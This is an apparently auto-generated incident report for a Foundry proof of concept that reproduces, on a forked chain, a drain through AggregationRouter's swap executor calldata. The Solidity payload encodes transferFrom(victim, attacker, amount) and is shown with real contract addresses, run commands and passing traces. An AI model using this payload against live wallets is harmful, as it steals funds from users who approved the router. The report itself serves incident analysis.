# AggregationRouter FiatTokenV2_2 Allowance-Abuse PoC (chainid 1329)

## 1. Overview & Context

This proof-of-concept (PoC) reproduces an on-chain exploit on chainid 1329 in which an unprivileged external account abuses the `AggregationRouter` to drain a victim’s FiatTokenV2_2 balance via an existing allowance. The router forwards arbitrary executor calldata to `FiatTokenProxy`, which in turn delegates to the FiatTokenV2_2 implementation. By encoding a `transferFrom(victim, attacker, amount)` call, the attacker spends the victim’s allowance without any victim-originated transaction.

The PoC is implemented as a Foundry test that:

- Forks chainid 1329 at block `167_791_782`, matching the pre-incident state (`sigma_B`) from the root cause analysis.
- Uses real on-chain contracts: `AggregationRouter`, `FiatTokenProxy` (FiatTokenV2_2), and `syUSD`.
- Abuses the victim’s FiatTokenV2_2 allowance to `AggregationRouter` to move `17_999_880_000` units from the victim to a fresh attacker address.

To run the PoC end-to-end (from the Forge project root `forge_poc`):

```bash
cd forge_poc
RPC_URL="<resolved QuickNode URL for chainid 1329>" forge test --via-ir -vvvvv
```

In the experiment harness, `RPC_URL` is built from `artifacts/poc/rpc/chainid_rpc_map.json` and `.env` (QuickNode endpoint name and token) and injected into the test environment.

## 2. PoC Architecture & Key Contracts

The main PoC is implemented in `test/Exploit.t.sol` as the contract `ExploitTest`. It relies on the following core actors and contracts:

- `VICTIM`: `0x9A9F47F38276f7F7618Aa50Ba94B49693293Ab50` — the EOA whose FiatTokenV2_2 balance and allowance are abused.
- `AGGREGATION_ROUTER`: `0x14bb98581Ac1F1a43fD148db7d7D793308Dc4d80` — the router exposing `swap(SwapParams)` and forwarding executor calldata.
- `FIAT_TOKEN_PROXY`: `0xe15fC38F6D8c56aF07bbCBe3BAf5708A2Bf42392` — the proxy for FiatTokenV2_2, which delegates to the verified implementation and enforces allowances.
- `SYUSD`: `0x059A6b0bA116c63191182a0956cF697d0d2213eC` — ERC20 used as both `srcToken` and `dstToken` in the swap, with a zero `amount`.
- `attacker`: a fresh address created via `makeAddr("attacker")`, representing the adversary.

Key configuration constants in `ExploitTest`:

```solidity
uint256 internal constant FORK_BLOCK = 167_791_782;
uint256 internal constant STOLEN_AMOUNT = 17_999_880_000;
address internal constant VICTIM = 0x9A9F47F38276f7F7618Aa50Ba94B49693293Ab50;
address internal constant AGGREGATION_ROUTER = 0x14bb98581Ac1F1a43fD148db7d7D793308Dc4d80;
address internal constant FIAT_TOKEN_PROXY = 0xe15fC38F6D8c56aF07bbCBe3BAf5708A2Bf42392;
address internal constant SYUSD = 0x059A6b0bA116c63191182a0956cF697d0d2213eC;
```

*Snippet 1 — Core configuration constants from `ExploitTest`, capturing the fork block, stolen amount, and key incident addresses.*

During `setUp()`, the test:

- Reads `RPC_URL` from the environment and creates a fork at `FORK_BLOCK`.
- Instantiates interface handles for FiatTokenV2_2 (`fiatToken`), `AggregationRouter` (`router`), and `syUSD` (`syUsdToken`).
- Creates a fresh `attacker` address and labels all key participants using `vm.label` for readability in traces.

## 3. Adversary Execution Flow

The end-to-end exploit is implemented in `test_exploit_end_to_end()` with a helper `_reproducerAttack()` that constructs and sends the router call.

### 3.1 Funding and Environment Setup

The test first validates the fork and pre-state:

```solidity
assertEq(block.chainid, 1329, "fork must be on chainid 1329");

uint256 victimBalanceBefore = fiatToken.balanceOf(VICTIM);
assertGe(
    victimBalanceBefore,
    STOLEN_AMOUNT,
    "victim must have at least the stolen amount of FiatTokenV2_2 before exploit"
);

uint256 allowanceBefore = fiatToken.allowance(VICTIM, AGGREGATION_ROUTER);
assertGe(
    allowanceBefore,
    STOLEN_AMOUNT,
    "victim allowance to AggregationRouter must cover the stolen amount"
);

uint256 attackerBalanceBefore = fiatToken.balanceOf(attacker);
vm.deal(attacker, 10 ether);
```

*Snippet 2 — Environment and pre-oracle checks: ensuring correct chain, victim balance, and allowance before the exploit.*

These checks confirm that the forked state matches the documented pre-incident conditions where the victim has sufficient FiatTokenV2_2 and has granted a large allowance to `AggregationRouter`.

### 3.2 Exploit Execution

The core exploit flow is encoded in `_reproducerAttack()`:

```solidity
IAggregationRouter.SwapParams memory params;
params.srcToken = syUsdToken;
params.dstToken = syUsdToken;
params.amount = 0;
params.executor = payable(FIAT_TOKEN_PROXY);

params.executeParams = abi.encodeWithSelector(
    IERC20.transferFrom.selector,
    VICTIM,
    attacker,
    STOLEN_AMOUNT
);

params.extraData = bytes("");

router.swap(params);
```

*Snippet 3 — Exploit payload: zero-amount syUSD swap with executor set to `FiatTokenProxy`, embedding a FiatTokenV2_2 `transferFrom(victim, attacker, STOLEN_AMOUNT)` call.*

Within `test_exploit_end_to_end()`, the attacker executes this payload unprivileged:

```solidity
vm.startPrank(attacker);
_reproducerAttack();
vm.stopPrank();
```

This mirrors the incident transaction where an arbitrary EOA calls `AggregationRouter.swap` with:

- `srcToken = dstToken = syUSD`
- `amount = 0`
- `executor = FiatTokenProxy`
- `executeParams` = FiatTokenV2_2 `transferFrom(victim, attacker, 17_999_880_000)`

### 3.3 Profit Realization

Post-exploit, the test evaluates attacker profit and victim loss:

```solidity
assertEq(
    address(fiatToken),
    FIAT_TOKEN_PROXY,
    "profit asset must be FiatTokenV2_2 proxy on chainid 1329"
);

uint256 attackerBalanceAfter = fiatToken.balanceOf(attacker);
assertGt(
    attackerBalanceAfter,
    attackerBalanceBefore,
    "attacker must end with strictly more FiatTokenV2_2 after exploit"
);

uint256 victimBalanceAfter = fiatToken.balanceOf(VICTIM);
assertLt(
    victimBalanceAfter,
    victimBalanceBefore,
    "victim must lose FiatTokenV2_2 balance during exploit"
);
```

*Snippet 4 — Post-state oracles: confirming that the attacker profits in FiatTokenV2_2 and the victim’s FiatTokenV2_2 balance decreases.*

The Forge trace from validation confirms this flow:

- `FiatTokenProxy::transferFrom(victim, attacker, 17999880000)` delegatecalls into FiatTokenV2_2.
- The victim’s balance drops from `18_167_880_000` to `168_000_000`.
- The attacker’s balance increases from `0` to `17_999_880_000`.

The PoC focuses on the allowance-abuse drain itself. The post-drain settlement (routing stolen funds via LiFi) is out of scope, as it does not affect the core ACT predicate.

## 4. Oracle Definitions and Checks

The oracle specification in `oracle_definition.json` defines variables, pre-checks, and constraints that the PoC must satisfy.

### 4.1 Variables

From the oracle definition:

- `attacker` — logical adversary address (fresh in the PoC).
- `victim` — `0x9A9F47F38276f7F7618Aa50Ba94B49693293Ab50`.
- `aggregationRouter` — `0x14bb98581Ac1F1a43fD148db7d7D793308Dc4d80`.
- `fiatToken` — FiatTokenV2_2 proxy at `0xe15fC38F6D8c56aF07bbCBe3BAf5708A2Bf42392`.
- `syUSD` — `0x059A6b0bA116c63191182a0956cF697d0d2213eC`.

The PoC maps these directly to constants and interface fields in `ExploitTest`, ensuring address alignment with the incident.

### 4.2 Pre-Checks

The oracle pre-checks require:

1. **Correct fork configuration** — chainid 1329 at or before block 167791782.
2. **Victim balance pre-condition** — victim holds at least the stolen amount of FiatTokenV2_2.
3. **Victim allowance pre-condition** — victim’s allowance to `AggregationRouter` is at least the stolen amount.

The PoC implements these as:

- `vm.createSelectFork(rpcUrl, FORK_BLOCK)` with `FORK_BLOCK = 167_791_782`, and an explicit `assertEq(block.chainid, 1329, ...)`.
- `victimBalanceBefore = fiatToken.balanceOf(VICTIM); assertGe(victimBalanceBefore, STOLEN_AMOUNT, ...)`.
- `allowanceBefore = fiatToken.allowance(VICTIM, AGGREGATION_ROUTER); assertGe(allowanceBefore, STOLEN_AMOUNT, ...)`.

These checks directly mirror the `pre_check` assertions from the oracle definition.

### 4.3 Hard Constraints

The hard constraints are:

1. **Asset-type oracle (`hard_asset_type_fiat_token`)** — the drained and profit asset must be FiatTokenV2_2 via `FiatTokenProxy` at `0xe15f...2392`.
2. **Revert behavior oracle (`hard_revert_behavior_unprivileged_swap_succeeds`)** — an unprivileged attacker calling `AggregationRouter.swap` must succeed (no revert).

In the PoC:

- `assertEq(address(fiatToken), FIAT_TOKEN_PROXY, "profit asset must be FiatTokenV2_2 proxy on chainid 1329");` implements the asset-type hard oracle.
- The exploit is executed from `attacker` with `vm.startPrank(attacker); _reproducerAttack(); vm.stopPrank();` and no `vm.expectRevert`, so any revert in `swap` causes the test to fail. The validator run shows `[PASS] test_exploit_end_to_end()`.

### 4.4 Soft Constraints

Soft constraints include:

1. **Attacker profit (`soft_attacker_profit_fiat_token`)** — the attacker’s FiatTokenV2_2 balance must strictly increase.
2. **Victim depletion (`soft_victim_depletion_fiat_token`)** — the victim’s FiatTokenV2_2 balance must strictly decrease.

These are implemented as:

- `assertGt(attackerBalanceAfter, attackerBalanceBefore, "attacker must end with strictly more FiatTokenV2_2 after exploit");`
- `assertLt(victimBalanceAfter, victimBalanceBefore, "victim must lose FiatTokenV2_2 balance during exploit");`

Both pass in the validator run, with the balances exactly matching the incident amounts.

Overall, the PoC fully aligns with the oracle specification: it uses the same variables, runs the required pre-checks, enforces both hard constraints, and satisfies the soft profit/depletion oracles.

## 5. Validation Result and Robustness

The PoC validator executed the following command from the Forge project:

```bash
cd /home/wesley/TxRayExperiment/incident-202601031102/forge_poc \
  && RPC_URL="<QuickNode URL for chainid 1329>" \
     forge test --via-ir -vvvvv \
     > /home/wesley/TxRayExperiment/incident-202601031102/forge_poc/artifacts/poc/poc_validator/forge-test.log 2>&1
```

Key outcomes:

- Test suite: `test/Exploit.t.sol:ExploitTest`.
- Result: `1 passed; 0 failed; 0 skipped`.
- Main test: `[PASS] test_exploit_end_to_end() (gas: 112013)`.
- Trace confirms:
  - `FiatTokenProxy::balanceOf(victim)` and `FiatTokenProxy::allowance(victim, AggregationRouter)` match documented pre-state.
  - `AggregationRouter::swap(...)` calls `syUSD::transferFrom(attacker, FiatTokenProxy, 0)` (a zero-amount no-op) and then `FiatTokenProxy::transferFrom(victim, attacker, 17999880000)`.
  - Post-state balances show direct transfer of `17_999_880_000` FiatTokenV2_2 units from victim to attacker.

The structured validation result is recorded at:

- `artifacts/poc/poc_validator/poc_validated_result.json`

with `overall_status = "Pass"` and:

- `passes_validation_oracles.passed = "true"`.
- Quality checks all marked as `"true"`:
  - Oracle alignment with definition.
  - Human-readable and labeled flow.
  - No unexplained magic numbers.
  - Mainnet fork without local mocks.
  - Self-contained attacker (fresh EOA, no attacker-side artifacts).
  - End-to-end ACT sequence described.
  - Alignment with the root cause report.

## 6. Linking PoC Behavior to Root Cause

The root cause report describes an ACT-class exploit where:

- A victim grants `AggregationRouter` a large FiatTokenV2_2 allowance via `FiatTokenProxy`.
- An attacker EOA calls `AggregationRouter.swap` with:
  - `srcToken = dstToken = syUSD`.
  - `amount = 0`.
  - `executor = FiatTokenProxy`.
  - `executeParams` encoding `FiatTokenV2_2::transferFrom(victim, attacker, 17_999_880_000)`.
- AggregationRouter forwards `executeParams` to `FiatTokenProxy`, which delegates to FiatTokenV2_2 and spends the victim’s allowance, moving tokens from victim to attacker.

The PoC reproduces this behavior precisely:

- **Executor abuse**: `_reproducerAttack()` configures `SwapParams` with `executor = FIAT_TOKEN_PROXY` and encodes `transferFrom(victim, attacker, STOLEN_AMOUNT)` as `executeParams`, matching the executor pattern described in the root cause.
- **Zero-amount syUSD transfer**: `amount = 0` with `srcToken = dstToken = syUSD` leads to a zero-amount `syUSD::transferFrom`, confirming that the economic effect resides solely in the executor payload, as highlighted in the incident analysis.
- **Allowance misuse**: The pre-checks enforce that `fiatToken.allowance(victim, AggregationRouter) >= STOLEN_AMOUNT`; the trace shows FiatTokenV2_2’s `transferFrom` using this allowance to move tokens from victim to attacker.
- **Direct victim-to-attacker flow**: Post-state oracles confirm that the victim’s FiatTokenV2_2 balance decreases while the attacker’s increases by the same amount, reflecting the same victim-funded drain documented in the root cause report.

From an ACT perspective:

- **Adversary-crafted step (A)**: The attacker crafts and submits a single `swap(SwapParams)` transaction targeting `AggregationRouter`.
- **Chain-enforced behavior (C)**: The chain enforces FiatTokenV2_2 allowance checks and AggregationRouter’s executor behavior, permitting `transferFrom(victim, attacker, STOLEN_AMOUNT)` because the victim pre-approved the router.
- **Target-observed outcome (T)**: The victim’s FiatTokenV2_2 balance drops and the attacker’s balance increases, satisfying the profit and depletion oracles.

The PoC thus faithfully exercises the protocol bug identified in the root cause analysis and demonstrates a robust, repeatable exploit strategy using only public on-chain state and standard transactions. No modifications to contract code or contrived local mocks are required, ensuring that the PoC remains a realistic representation of the incident behavior. 

